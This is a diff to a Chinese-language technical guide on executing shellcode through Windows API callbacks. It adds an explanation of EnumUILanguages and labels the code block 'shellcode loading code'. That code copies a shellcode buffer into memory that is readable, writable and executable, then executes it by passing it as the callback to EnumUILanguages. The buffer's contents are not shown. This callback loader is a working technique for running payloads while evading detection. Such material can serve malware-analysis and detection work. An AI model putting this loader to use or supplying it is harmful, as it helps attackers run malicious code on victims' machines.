@@ -484,6 +484,22 @@ int main() {
 
 ## EnumUILanguages
 
+`EnumUILanguages` 函数是一个Windows API函数，用于枚举系统支持的用户界面（UI）语言。这个函数可以让应用程序查询系统支持的所有UI语言，这对于开发多语言支持的应用程序特别有用。它遵循特定的回调函数模式，意味着你需要提供一个回调函数，`EnumUILanguages` 会为系统中每一种可用的UI语言调用这个回调函数一次
+
+其函数原型如下所示：
+
+```cpp
+BOOL EnumUILanguagesW(
+  UILANGUAGE_ENUMPROCW lpUILanguageEnumProc,  // 指向回调函数的指针
+  DWORD                 dwFlags,  // 指定枚举语言的行为
+  LONG_PTR              lParam  // 提供一个应用程序定义的值，该值随着每次回调函数调用被传递
+);
+```
+
+
+
+shellcode加载代码如下所示：
+
 ```cpp
 #include <Windows.h>
 
@@ -493,14 +509,7 @@ void CallBack() {
 
     void* p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     memcpy(p, shellcode, sizeof(shellcode));
-	
-    /*
-    EnumUILanguages 函数是在 Windows 操作系统中使用的一个函数，它用于列举安装在系统上的用户界面语言（UI language）
-    参数1:指向回调函数的指针,这个回调函数将在每个列举到的用户界面语言上被调用
-    参数2:指定列举语言时的选项和标志
-    参数3:应用程序定义的一个参数，它将传递给回调函数
-    */
-    
+	  
     EnumUILanguages((UILANGUAGE_ENUMPROC)p, 0, 0);
 
 }
@@ -509,8 +518,6 @@ int main() {
     CallBack();
 }
 ```
-
-
 
 
 
